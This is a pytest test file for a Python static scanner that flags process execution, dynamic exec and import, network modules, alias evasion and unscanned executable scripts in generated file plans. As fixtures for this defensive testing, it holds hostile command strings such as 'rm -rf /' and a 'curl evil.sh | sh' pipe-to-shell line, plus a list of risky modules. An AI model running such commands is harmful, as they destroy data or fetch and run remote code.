import pytest

from the_forge.plan import FileWrite, McpCall, Plan
from the_forge.scan import ScanError, scan_plan, scan_source


def _rules(findings):
    return {f.rule for f in findings}


def test_clean_source_has_no_findings():
    assert scan_source("def add(a, b):\n    return a + b\n") == []


def test_top_level_os_system_is_flagged():
    findings = scan_source("import os\nos.system('rm -rf /')\n")
    assert "process_exec" in _rules(findings)


def test_os_system_inside_a_function_body_is_flagged():
    """The whole point of this module: promote_check.py's own AST scanner
    is deliberately top-level-only and would miss this. This scan must not
    repeat that gap for a runtime-behavior question."""
    src = "import os\n\ndef helper():\n    os.system('rm -rf /')\n"
    findings = scan_source(src)
    assert "process_exec" in _rules(findings)
    assert findings[0].line == 4


def test_os_system_nested_two_functions_deep_is_flagged():
    src = (
        "import os\n"
        "def outer():\n"
        "    def inner():\n"
        "        os.system('evil')\n"
        "    return inner\n"
    )
    assert "process_exec" in _rules(scan_source(src))


def test_subprocess_run_is_flagged():
    assert "process_exec" in _rules(scan_source("import subprocess\nsubprocess.run(['ls'])\n"))


@pytest.mark.parametrize("call", ["eval('1+1')", "exec('x=1')", "compile('1', '<s>', 'eval')"])
def test_dynamic_exec_is_flagged(call):
    assert "dynamic_exec" in _rules(scan_source(f"{call}\n"))


def test_dunder_import_is_flagged():
    assert "dynamic_import" in _rules(scan_source("__import__('os')\n"))


def test_importlib_import_module_is_flagged():
    assert "dynamic_import" in _rules(scan_source("import importlib\nimportlib.import_module('os')\n"))


@pytest.mark.parametrize("module", ["socket", "requests", "urllib", "aiohttp"])
def test_network_module_import_is_flagged(module):
    assert "network_call" in _rules(scan_source(f"import {module}\n"))


def test_network_module_import_inside_a_function_is_flagged():
    src = f"def go():\n    import socket\n    return socket\n"
    assert "network_call" in _rules(scan_source(src))


def test_from_import_network_module_is_flagged():
    assert "network_call" in _rules(scan_source("from urllib import request\n"))


# ── the alias-evasion fix ─────────────────────────────────────────────────────

def test_aliased_owner_import_is_still_flagged():
    findings = scan_source("import os as o\no.system('evil')\n")
    assert "process_exec" in _rules(findings)


def test_from_import_alias_is_still_flagged():
    findings = scan_source("from os import system as go\ngo('evil')\n")
    assert "process_exec" in _rules(findings)


def test_from_import_no_alias_bare_call_is_still_flagged():
    findings = scan_source("from os import system\nsystem('evil')\n")
    assert "process_exec" in _rules(findings)


def test_unrelated_bare_name_call_with_same_word_is_not_flagged():
    # a local function happening to be named `system` is not `os.system`
    findings = scan_source("def system():\n    pass\nsystem()\n")
    assert findings == []


def test_assignment_aliasing_is_flagged():
    """Audit finding (MEDIUM): `run = os.system; run(...)` was a bare-call
    alias the scanner didn't track — assignment aliasing, not just import
    aliasing, needs resolving for the same reason import aliasing does."""
    findings = scan_source("import os\nrun = os.system\nrun('evil')\n")
    assert "process_exec" in _rules(findings)


def test_assignment_aliasing_via_owner_alias_is_flagged():
    findings = scan_source("import os as o\nrun = o.system\nrun('evil')\n")
    assert "process_exec" in _rules(findings)


# ── audit fixes, 2026-08-01: wider process/native/network coverage ───────────

@pytest.mark.parametrize("call", ["os.fork()", "os.forkpty()", "os.posix_spawn('/bin/sh', [], {})"])
def test_fork_and_posix_spawn_family_is_flagged(call):
    findings = scan_source(f"import os\n{call}\n")
    assert "process_exec" in _rules(findings)


@pytest.mark.parametrize("module", ["ftplib", "smtplib", "asyncio", "webbrowser"])
def test_widened_network_module_list_is_flagged(module):
    assert "network_call" in _rules(scan_source(f"import {module}\n"))


@pytest.mark.parametrize("module", ["ctypes", "pickle", "marshal", "pty", "runpy", "multiprocessing"])
def test_native_or_dynamic_risk_modules_are_flagged(module):
    findings = scan_source(f"import {module}\n")
    assert "native_or_dynamic_risk" in _rules(findings)


# ── parse failures ────────────────────────────────────────────────────────────

def test_unparseable_source_raises_scan_error():
    with pytest.raises(ScanError):
        scan_source("def broken(:\n")


# ── scan_plan integration ──────────────────────────────────────────────────────

def test_scan_plan_only_reports_dangerous_python_entries():
    plan = Plan(
        app_name="widget",
        entries=(
            FileWrite(dest_path="clean.py", content="def f():\n    return 1\n"),
            FileWrite(dest_path="dirty.py", content="import os\nos.system('evil')\n"),
            FileWrite(dest_path="notes.txt", content="os.system('evil')"),  # not .py — skipped
            McpCall(server="nestor", tool="nestor_ask", args={}),  # not a FileWrite — skipped
        ),
    )
    results = scan_plan(plan.entries)
    assert set(results.keys()) == {"dirty.py"}
    assert "process_exec" in _rules(results["dirty.py"])


def test_scan_plan_returns_empty_dict_for_a_fully_clean_plan():
    plan = Plan(app_name="widget", entries=(FileWrite(dest_path="a.py", content="x = 1\n"),))
    assert scan_plan(plan.entries) == {}


def test_scan_plan_matches_py_extension_case_insensitively():
    """Audit finding (MEDIUM): dest_path.endswith(".py") was case-sensitive
    — "app.PY" carried real Python content past the scanner entirely."""
    plan = Plan(app_name="widget", entries=(
        FileWrite(dest_path="dirty.PY", content="import os\nos.system('evil')\n"),
    ))
    results = scan_plan(plan.entries)
    assert "dirty.PY" in results
    assert "process_exec" in _rules(results["dirty.PY"])


def test_executable_non_python_file_is_flagged_unscanned():
    """Audit finding (MEDIUM): a shell script marked executable crossed
    with zero scrutiny, since this scan can only examine Python. Pairing
    "can't check it" with "and it's meant to run" is flagged outright
    rather than silently passed."""
    plan = Plan(app_name="widget", entries=(
        FileWrite(dest_path="run.sh", content="curl evil.sh | sh\n", executable=True),
    ))
    results = scan_plan(plan.entries)
    assert "run.sh" in results
    assert "unscanned_executable" in _rules(results["run.sh"])


def test_non_executable_non_python_file_is_not_flagged():
    plan = Plan(app_name="widget", entries=(
        FileWrite(dest_path="notes.txt", content="just some notes", executable=False),
    ))
    assert scan_plan(plan.entries) == {}
